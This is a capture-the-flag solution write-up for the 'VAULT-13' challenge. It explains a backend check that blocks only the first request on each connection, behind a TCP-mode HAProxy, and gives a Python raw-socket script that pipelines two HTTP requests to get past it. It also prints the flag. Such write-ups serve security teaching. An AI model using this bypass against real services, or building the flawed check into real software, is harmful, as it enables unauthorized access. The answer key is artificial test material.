# Solution — VAULT-13 Research Terminal

## Root Cause Analysis

### The "firewall"

The backend (`app.py`) implements a per-connection state variable `first_request`:

```python
def handle_client(client_socket, addr):
    first_request = True
    ...
    while True:
        ...
        if first_request and '/classified' in path:
            response = build_response('403 Forbidden', BLOCKED_HTML)
            client_socket.sendall(response)
            first_request = False
            continue

        first_request = False

        if path == '/classified/research-data':
            response = build_response('200 OK', FLAG_HTML)
        ...
```

The rule: the **first HTTP request** on a TCP connection that targets `/classified`
is blocked. Any subsequent request on that same connection is allowed through.

### The proxy

HAProxy is configured with `mode tcp`:

```
defaults
    mode tcp
```

In TCP mode, HAProxy acts as a **raw byte forwarder**. It does **not** parse
HTTP at all — it simply relays whatever bytes arrive on the socket directly
to the backend, preserving the TCP connection (and therefore the connection
state in the backend).

### The vulnerability

Because HAProxy keeps the TCP connection alive and the backend processes
requests sequentially on it, an attacker can **pipeline two HTTP requests
in a single TCP send**:

1. A first benign request (e.g. `GET /`) → consumes `first_request = True`,
   sets `first_request = False`.
2. A second request to `GET /classified/research-data` → `first_request` is
   already `False` → the check is skipped → flag is returned.

This is **HTTP request pipelining** abused through a TCP-mode proxy. The
proxy forwards both requests as a single stream; the backend processes them
in order on the same connection.

---

## Exploitation

### Manual (raw socket)

Send the two requests in a single `sendall()` so they travel as one TCP segment:

```python
import socket

host = "CHALLENGE_HOST"
port = CHALLENGE_PORT

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
sock.settimeout(5)

payload = (
    f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n"
    f"GET /classified/research-data HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
)

sock.sendall(payload.encode())

response = b""
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
except socket.timeout:
    pass

sock.close()
print(response.decode('latin-1'))
```

The provided `solve.py` does exactly this.

### Running the solver

```bash
python3 solution/solve.py <host> <port>
```

The second HTTP response in the output contains the flag.

---

## Why it works (key conditions)

| Condition | Effect |
|---|---|
| HAProxy in `mode tcp` | Does not parse HTTP, keeps the TCP connection open between player and backend |
| Backend uses `Connection: keep-alive` by default | The same TCP connection handles multiple requests |
| Firewall checks only `first_request` flag | A single benign pipelined request before the attack request is enough to bypass it |
| Both requests sent in one `sendall()` | Guarantees they arrive at the backend on the same TCP connection |

---

## Flag

```
flag{smuggl3d_p4st_th3_w4st3l4nd_f1r3w4ll}
```
